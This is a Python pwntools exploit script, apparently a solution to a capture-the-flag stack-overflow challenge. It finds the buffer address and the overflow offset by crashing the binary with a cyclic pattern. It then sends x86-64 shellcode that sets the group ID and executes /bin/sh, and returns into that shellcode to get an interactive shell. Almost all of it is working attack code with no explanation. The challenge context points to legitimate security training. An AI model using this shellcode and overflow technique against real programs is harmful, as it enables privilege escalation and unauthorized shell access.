from pwn import *
import os

DEBUG = False 

# crash the process to get a core file and find the buffer address (still boilerplate)

io = process('./stack-ovfl-sc-64', env={}, setuid=False)
io.sendline(cyclic(10000)) 
io.wait()
core = io.corefile
buffer_address = core.stack.find(cyclic(50))
max_len = cyclic(10000).find(p64(core.fault_addr))
os.unlink(core.path) 

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug('./stack-ovfl-sc-64', env={}, gdbscript='''
b *input_func+110
continue
''')

else:
    io = process('./stack-ovfl-sc-64', env={})


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE
context.arch = 'x86-64'
context.bits = 64

shellcode = asm('''
mov    rax,0x6c
syscall
mov    rdi,rax
mov    rsi,rax
mov    eax,0x72
syscall
mov    rsi,0x0
mov    rdx,0x0
mov    rax,0x3b
movabs rbx,0x68732f6e69622f2f

push   0x0
push   rbx
mov    rdi,rsp
syscall
''') 

payload = shellcode + b"A" * (max_len - len(shellcode)) + p64(buffer_address)
io.send(payload)
io.interactive()

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

# import re
# io.sendlineafter(b'$', b'cat flag')
# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
# print(flag)
